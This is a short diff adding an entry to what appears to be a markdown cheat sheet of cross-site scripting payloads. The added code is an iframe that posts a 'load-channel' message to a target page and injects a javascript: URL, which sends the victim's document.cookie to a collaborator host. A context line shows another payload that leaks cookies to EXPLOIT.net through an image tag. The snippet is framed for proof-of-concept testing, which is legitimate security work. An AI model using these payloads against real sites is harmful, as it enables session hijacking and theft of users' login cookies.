@@ -232,6 +232,18 @@ document.write('<img src="HTTPS://EXPLOIT.net/?c='+document.cookie+'" />');
 }), "*");'>
 ```  
 
+>IFRAME + Load-Channel + fetch  
+
+```JavaScript
+<iframe src="https://TARGET.net/"
+        onload='this.contentWindow.postMessage(
+          JSON.stringify({
+            type: "load-channel",
+            url: "javascript:fetch(`https://COLLABORATOR.com/?poc=`+encodeURIComponent(document.cookie))"
+          }), "*")'>
+</iframe>
+```  
+
 >Javascript set test cookie in current browser session with no HttpOnly flag to allow proof of concept cookie stealer.  
 
 ```
